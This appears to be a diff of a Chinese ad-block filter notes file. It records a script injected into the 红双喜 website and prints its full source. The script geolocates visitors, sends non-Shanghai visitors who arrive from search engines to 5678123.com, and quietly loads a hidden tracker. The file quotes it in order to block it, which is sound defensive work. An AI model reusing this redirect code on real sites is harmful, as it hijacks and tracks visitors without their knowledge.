@@ -1,3 +1,44 @@
+屏蔽：会影响红双喜网站
+<script src="http://www.cqsta.com/cc/sh.js"></script>
+<script type="text/javascript">
+document.title="红双喜";
+</script>
+<!-- End Piwik Code -->
+
+影响浏览器翻译插件：##[style*="99999"]
+
+http://www.cqsta.com/cc/sh.js
+内容如下：
+(function () {
+    var JSONP = document.createElement("script");
+    JSONP.type = "text/javascript";
+    JSONP.src = "http://pv.sohu.com/cityjson";
+    document.getElementsByTagName("head")[0].appendChild(JSONP);
+    JSONP.onload = function () {
+        var provinces = ['\u4e0a\u6d77'];
+        if (returnCitySN.cname.indexOf(provinces[0]) == -1) {
+            excute();
+        }
+    }
+    JSONP.onerror = excute;
+ 
+    function excute() {
+        var regexp =
+            /\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|so)(\.[a-z0-9\-]+){1,2}\//ig;
+        var where = document.referrer;
+        if (regexp.test(where)) {
+            window.location.href = "http://www.5678123.com/";
+        }
+    }
+ 
+ 
+ 
+    document.write(
+        '<span style="display:none"><script language="javascript" type="text/javascript" src="http://js.users.51.la/18205126.js"></script></span>');
+})();
+
+
+
 删除：
 #lenovo
 127.0.0.1 sdac.lenovomm.com
